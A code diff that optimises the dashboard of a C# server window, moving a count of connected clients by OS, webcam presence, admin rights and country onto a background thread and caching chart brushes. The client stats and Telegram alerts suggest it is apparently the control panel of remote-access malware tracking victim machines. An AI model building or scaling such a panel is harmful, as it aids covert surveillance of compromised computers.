@@ -102,6 +102,12 @@ public partial class ServerWindow : ThemedWindow
     // Shared HttpClient for all Telegram API calls — avoids socket exhaustion from new HttpClient() per alert.
     private static readonly System.Net.Http.HttpClient _telegramHttp = new() { Timeout = TimeSpan.FromSeconds(15) };
 
+    // Frozen brushes for activity chart — allocated once, not on every 5s dashboard tick
+    private static readonly SolidColorBrush _chartGridBrush  = MakeArgbBrush(0x18, 0x4A, 0x85, 0xF5);
+    private static readonly SolidColorBrush _chartLabelBrush = MakeArgbBrush(0x60, 0x80, 0x90, 0xB4);
+    private static SolidColorBrush MakeArgbBrush(byte a, byte r, byte g, byte b)
+    { var br = new SolidColorBrush(Color.FromArgb(a, r, g, b)); br.Freeze(); return br; }
+
     private static readonly HashSet<string> _lightThemeKeys = new(StringComparer.Ordinal)
     {
         "VS2017Light", "Seven",
@@ -735,7 +741,7 @@ public partial class ServerWindow : ThemedWindow
     private void WinNotifyGoToClient_Click(object sender, RoutedEventArgs e)
     {
         if (GridWinNotify.SelectedItem is not WinNotifyEntry entry || string.IsNullOrEmpty(entry.ClientId)) return;
-        var client = _onlineClients.FirstOrDefault(c => c.Id == entry.ClientId);
+        _onlineById.TryGetValue(entry.ClientId, out var client);
         if (client == null) return;
         if (NavOnline != null) NavOnline.IsChecked = true;
         GridClients.SelectedItem = client;
@@ -1276,8 +1282,9 @@ public partial class ServerWindow : ThemedWindow
             counts[23 - (int)age]++;
         }
 
-        int peak = Math.Max(1, counts.Max());
-        DashPeak.Text = counts.Max() == 0 ? "—" : counts.Max().ToString();
+        int rawMax = counts.Max();
+        int peak = Math.Max(1, rawMax);
+        DashPeak.Text = rawMax == 0 ? "—" : rawMax.ToString();
 
         // Remove previous dynamic children (keep Polyline and Polygon which are declared in XAML)
         for (int i = DashChart.Children.Count - 1; i >= 0; i--)
@@ -1287,7 +1294,7 @@ public partial class ServerWindow : ThemedWindow
         }
 
         // Horizontal grid lines
-        var gridBrush = new SolidColorBrush(Color.FromArgb(0x18, 0x4A, 0x85, 0xF5));
+        var gridBrush = _chartGridBrush;
         for (int g = 1; g <= 3; g++)
         {
             double y = h * g / 4.0;
@@ -1323,7 +1330,7 @@ public partial class ServerWindow : ThemedWindow
         DashChartFill.Points = fillPoints;
 
         // Hour labels every 6h: -18h, -12h, -6h, now
-        var labelBrush = new SolidColorBrush(Color.FromArgb(0x60, 0x80, 0x90, 0xB4));
+        var labelBrush = _chartLabelBrush;
         foreach (int idx in new[] { 0, 6, 12, 18, 23 })
         {
             double x = padL + idx * step;
@@ -1382,47 +1389,55 @@ public partial class ServerWindow : ThemedWindow
         // ── Tagged count — maintained live in DataStore, O(1) ─────────────
         DashTagged.Text = _store.TaggedCount.ToString();
 
-        // ── Stat pills — single pass over online clients ─────────────────
-        var clients = _server?.ConnectedClients.Values.ToList() ?? [];
-        int n = clients.Count;
-        if (n > 0)
+        // ── Stat pills — 100k-client loop on background thread (no UI-thread block) ─────────────────
+        var connDict = _server?.ConnectedClients;
+        _ = Task.Run(() =>
         {
-            int win11 = 0, win10 = 0, cam = 0, admin = 0;
-            var countryCounts = new Dictionary<string, int>(n);
-            foreach (var c in clients)
+            int win11 = 0, win10 = 0, cam = 0, admin = 0, n = 0;
+            var countryCounts = new Dictionary<string, int>();
+            if (connDict != null)
             {
-                if      (c.OS.Contains("11")) win11++;
-                else if (c.OS.Contains("10")) win10++;
-                if (c.CameraStatus.Equals("Yes", StringComparison.OrdinalIgnoreCase)) cam++;
-                if (c.IsAdmin) admin++;
-                if (!string.IsNullOrEmpty(c.Country) && c.Country != "...")
+                foreach (var c in connDict.Values)
                 {
-                    countryCounts.TryGetValue(c.Country, out int cc);
-                    countryCounts[c.Country] = cc + 1;
+                    n++;
+                    if      (c.OS.Contains("11")) win11++;
+                    else if (c.OS.Contains("10")) win10++;
+                    if (c.CameraStatus.Equals("Yes", StringComparison.OrdinalIgnoreCase)) cam++;
+                    if (c.IsAdmin) admin++;
+                    if (!string.IsNullOrEmpty(c.Country) && c.Country != "...")
+                    {
+                        countryCounts.TryGetValue(c.Country, out int cc);
+                        countryCounts[c.Country] = cc + 1;
+                    }
                 }
             }
             int other = n - win11 - win10;
-            DashWin11.Text   = $"{win11 * 100 / n}%";
-            DashWin10.Text   = $"{win10 * 100 / n}%";
-            DashOsOther.Text = $"{other * 100 / n}%";
-            DashWebcam.Text  = $"{cam   * 100 / n}%";
-            DashAdmin.Text   = $"{admin * 100 / n}%";
-            DashOsWin11Bar.Value = win11 * 100 / n;
-            DashOsWin10Bar.Value = win10 * 100 / n;
-            DashOsOtherBar.Value = other * 100 / n;
-
             string? topKey = null; int topCnt = 0;
             foreach (var kv in countryCounts)
                 if (kv.Value > topCnt) { topCnt = kv.Value; topKey = kv.Key; }
-            DashTopCountry.Text = topKey != null ? $"{topKey} ×{topCnt}" : "—";
-        }
-        else
-        {
-            DashWin11.Text = DashWin10.Text = DashOsOther.Text = "—";
-            DashWebcam.Text = DashAdmin.Text = "—";
-            DashTopCountry.Text = "—";
-            DashOsWin11Bar.Value = DashOsWin10Bar.Value = DashOsOtherBar.Value = 0;
-        }
+            Dispatcher.BeginInvoke(() =>
+            {
+                if (n > 0)
+                {
+                    DashWin11.Text   = $"{win11 * 100 / n}%";
+                    DashWin10.Text   = $"{win10 * 100 / n}%";
+                    DashOsOther.Text = $"{other * 100 / n}%";
+                    DashWebcam.Text  = $"{cam   * 100 / n}%";
+                    DashAdmin.Text   = $"{admin * 100 / n}%";
+                    DashOsWin11Bar.Value = win11 * 100 / n;
+                    DashOsWin10Bar.Value = win10 * 100 / n;
+                    DashOsOtherBar.Value = other * 100 / n;
+                    DashTopCountry.Text = topKey != null ? $"{topKey} ×{topCnt}" : "—";
+                }
+                else
+                {
+                    DashWin11.Text = DashWin10.Text = DashOsOther.Text = "—";
+                    DashWebcam.Text = DashAdmin.Text = "—";
+                    DashTopCountry.Text = "—";
+                    DashOsWin11Bar.Value = DashOsWin10Bar.Value = DashOsOtherBar.Value = 0;
+                }
+            });
+        });
 
         // ── 24h activity chart ──────────────────────────────────────────────
         DrawActivityChart();
